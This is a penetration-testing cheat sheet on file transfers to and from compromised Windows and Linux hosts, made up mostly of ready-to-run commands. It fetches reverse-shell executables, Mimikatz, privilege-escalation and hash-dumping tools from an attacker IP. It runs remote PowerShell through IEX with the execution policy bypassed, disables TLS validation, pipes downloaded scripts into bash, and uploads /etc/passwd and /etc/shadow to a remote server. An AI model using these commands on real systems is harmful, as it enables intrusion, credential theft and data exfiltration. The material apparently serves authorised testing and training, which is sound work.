## File Transfers

### Windows File transfers

With command execution, figure out a working way to transfer files to the target.
#### Certutil

```powershell
certutil -urlcache -f http://10.250.226.250/win_revtcp_8000.exe revshell.exe
```

#### SMB

Grab the hashes as an added bonus!

On Kali use Impacket's SMB Server:

```bash
sudo impacket-smbserver coyote ./

#V2 Support
impacket-smbserver secure . -smb2support
# or just use go_smb.sh
coyote # sharename
./	# share mount point
```

On Windows: 

```powershell
# List dir
dir \\10.250.226.250\coyote
# Get file
copy \\10.250.226.250\coyote\file.exe .
# Execute file
\\10.250.226.250\coyote\file.exe
```

#### SMB over HTTP

Use WebDav

```bash
## Linux
# Install server on Kali
sudo pip install wsgidav cheroot

# Start server
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

## Windows
# Connect to Linux SMB server over HTTP
# NOTE DavWWWRoot is a special keyword that points to the root of the WebDAV server
dir \\192.168.49.128\DavWWWRoot
dir \\192.168.49.128\SomeShare
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\SomeShare\
```



#### Powershell from Webserver

```powershell
## Powershell 3.0
Invoke-WebRequest http://10.250.226.250/file.exe -OutFile c:\coyote\file.exe

# One-liner
powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/file.exe','c:\coyote\file.exe')

powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/ms15-051x64.exe','c:\coyote\ms15-051x64.exe')"

# WinPeas
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/winPEAS.exe','C:\coyote\winPEAS.exe')"

powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/shell.pdf','C:\users\admin\desktop\shell.pdf')"

# Juicy Potatoes
#x64
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/JuicyPotato.exe','C:\coyote\JuicyPotato.exe')"
#x86
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/JuicyPotatox86.exe','C:\coyote\JuicyPotatox86.exe')"

# Reverse Shell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/win_revtcp_8000.exe','C:\coyote\win_revtcp_8000.exe')"

# Mimikatz old
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/mimikatz_trunk.zip','C:\coyote\mimikatz_trunk.zip')"

# Mimikatz new
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/mimikatz.exe','C:\coyote\mimikatz.exe')"

# Kerberoast
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/Invoke-Kerberoast.ps1','C:\coyote\Invoke-Kerberoast.ps1')"

# PSExec
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/PsExec.exe','C:\coyote\PsExec.exe')"

# Netcat
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.250.226.250/nc.exe','C:\coyote\nc.exe')"
```

```bash
# Build a script & run it
echo $webclient = New-Object System.Net.WebClient>wget.ps1
echo $url = "http://10.250.226.250/nc.exe" >>wget.ps1
echo $file = "nc.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

# Run
powershell -ExecutionPolicy Bypass -force -File .\wget.ps1
```

##### Errors

```bash
# "The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.""
# Means IE11 setup not completed, bypass with:
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# Untrusted certificate error:
# "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."
# Bypass with:
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### Uploading to Webserver

Start apache2 or just use Python uploadserver

```bash
pip3 install uploadserver
## IDK how this command is different than the one above, but here it is
# python3 -m pip install --user uploadserver

## For HTTP only
python3 -m uploadserver

## If wanting HTTPS, create a certificate
openssl req -x509 -out /root/server.pem -keyout /root/server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
# Host using HTTPS
python3 -m uploadserver 443 --server-certificate /root/server.pem
```

U

```powershell
## Get PSUpload script
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
# Run upload command from it
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

# Alternate way that may work:
powershell (New-Object System.Net.WebClient).UploadFile('http://10.250.226.250/upload.php', 'important.docx')
```



#### Base64

Pasting as Base64, Linux to Windows

```bash
### Linux
# Make checksum
md5sum filename
# Base64 Encode
cat filename | base64 -w 0;echo

### Poweshell
## Insert Base64 where appropriate and paste into target to reproduce file
[IO.File]::WriteAllBytes("C:\Users\Public\filename", [Convert]::FromBase64String("BASE64STRING"))
## Check filesum to ensure it is correct
Get-FileHash C:\Users\Public\filename -Algorithm md5
```

Pasting as Base64, Windows to Linux

```bash
## Windows
# Dump file contents to base64 string
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
# Take MD5 of original file
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

## Linux
# Decode Base64 and send to file
echo <BASE64_STRING> | base64 -d > hosts
# Take checksum of file
md5sum hosts 
```

Use Base64 to upload

```bash
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

#### FTP server using a non-interactive prompt

Start Linux Python Server

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write
```

PowerShell

```bash
# Download a file

# Upload a file
## Idk if this works, because it doesn't login or anything
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Alternative: Building a script file in Windows for non-interactive command prompt

```bash
# Privesc Files
mkdir c:\coyote
cd c:\coyote
echo open 10.250.226.250 21> ftp.txt
echo USER rock>> ftp.txt
echo roll>> ftp.txt
echo passive >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo GET win_revtcp_8000.exe >> ftp.txt
echo cd winprivesc >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
del ftp.txt

# Privesc Files
mkdir c:\temp
cd c:\temp
echo open 10.250.226.250 21> ftp.txt
echo USER rock>> ftp.txt
echo roll>> ftp.txt
echo cd winprivesc >> ftp.txt
echo passive >> ftp.txt
echo bin >> ftp.txt
echo GET accesschk.exe >> ftp.txt
echo GET windows-privesc-check2.exe >> ftp.txt
echo GET win_enum_local.exe >> ftp.txt
echo GET winPEAS.bat >> ftp.txt
echo GET Get-System.ps1 >> ftp.txt
echo GET Invoke-PrivescCheck.ps1 >> ftp.txt
echo GET PowerUp.ps1 >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
del ftp.txt

# Kali Stock Hash Dump Tools
echo open 10.250.226.250 21> ftp.txt
echo user rock >> ftp.txt
echo roll>> ftp.txt
echo passive>> ftp.txt
echo bin >> ftp.txt
echo cd fgdump >> ftp.txt
echo GET cachedump64.exe >> ftp.txt
echo GET cachedump.exe >> ftp.txt
echo GET fgdump.exe >> ftp.txt
echo GET fgexec.exe >> ftp.txt
echo GET pstgdump.exe >> ftp.txt
echo GET PwDump.exe >> ftp.txt
echo GET servpw64.exe >> ftp.txt
echo GET servpw.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
del ftp.txt

# Custom Hash dump Tools
echo open 10.250.226.250 21> ftp.txt
echo user rock >> ftp.txt
echo roll>> ftp.txt
echo passive>> ftp.txt
echo bin >> ftp.txt
echo cd whashes >> ftp.txt
echo GET gsecdump.exe >> ftp.txt
echo GET DumpSvc.exe >> ftp.txt
echo GET lsadump2.exe >> ftp.txt
echo GET PWDumpX.exe >> ftp.txt
echo GET LSASecretsDump.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
del ftp.txt

# Uploading files
echo open 10.250.226.250 21> ftp.txt
echo user rock >> ftp.txt
echo roll>> ftp.txt
echo passive>> ftp.txt
echo bin >> ftp.txt
echo PUT somefile.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
del ftp.txt
```

#### Netcat

```bash
# Server end
nc -nvlp 8100 < send-to-file.exe

# Client end
nc -nv 10.250.226.250 8100 > save-to-file.exe
```

#### VBScript

```vbscript
'' Create this as wget.vbs
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```powershell
# Run the script
cscript wget.vbs http://10.250.226.250/getfile.exe saveasfile.exe
```

#### Issues

1. Consider that firewall ports may be blocking transfers, so try different ports if it seems to not be working.  

2. You may also enumerate the firewall to see what is allowed.

   ```powershell
   # Show current FW profile
   netsh advfirewall show currentprofile
   
   # Show all firewall rules
   netsh advfirewall firewall show rule name=all
   ```

#### Unzipping Files from PS

```bash
powershell -c Expand-Archive -Force C:\coyote\file.zip C:\coyote\folder\
```

### Running Remote Powershell Scripts

1. Host the powershell script on a web server instance

2. On the target, run:

   ```powershell
   # dot-source it and run a function.  To just dot-source it, remove the function
   powershell.exe -ExecutionPolicy Bypass -command "IEX (New-Object System.Net.WebClient).DownloadString('http://10.250.226.250/39719.ps1'); FUNCTION-HERE"
   ```

3. Note: on 64-bit systems, if you simply run powershell.exe, it is likely it will run the 32-bit version.  You need to specify the path to the 64-bit version (path may vary):

   ```powershell
   C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe -ExecutionPolicy Bypass -command "IEX (New-Object System.Net.WebClient).DownloadString('http://10.250.226.250/39719.ps1'); FUNCTION-HERE"
   ```
   
4. To run it straight from Powershell:

   ```powershell
   # Disable Execution Policy
   powershell -ExecutionPolicy Unrestricted -Scope CurrentUser -force
   # Dot Source Script & Run Command
   IEX (New-Object System.Net.WebClient).DownloadString('http://10.250.226.250/Sherlock.ps1'; FindAllVulns)
   ```

### Linux File Transfers

1. Webserver 

   ```bash
   ## Wget
   wget http://10.250.226.250/file.sh -O /tmp/file.sh
   # Fileless execution
   wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
   
   ## Curl
   curl -o /tmp/file.sh http://10.10.15.10/file.sh
   # Fileless execution
   curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
   # Upload
   curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
   
   ## Bash only
   # Connect to webserver on port 80
   exec 3<>/dev/tcp/10.10.10.32/80
   # Get request
   echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
   # Print response 
   cat <&3
   ```

2. FTP server

   ```bash
   ftp rock@10.250.226.250
   roll
   passive
   bin
   GET file
   bye
   ```

3. Netcat - Same as Windows

4. SCP (https://haydenjames.io/linux-securely-copy-files-using-scp/)

   ```bash
   ## Start SSH Service & check listening port
   sudo systemctl enable ssh
   sudo systemctl start ssh
   netstat -lnpt
   
   # Copy from remote to local
   scp root@192.168.153.44:/root/test.txt ./
   
   # Copy from local to remote
   scp file1 file2 root@192.168.153.44:/root/
   ```
   
5. Base64 - Same as Windows except just encode/decode from Linux only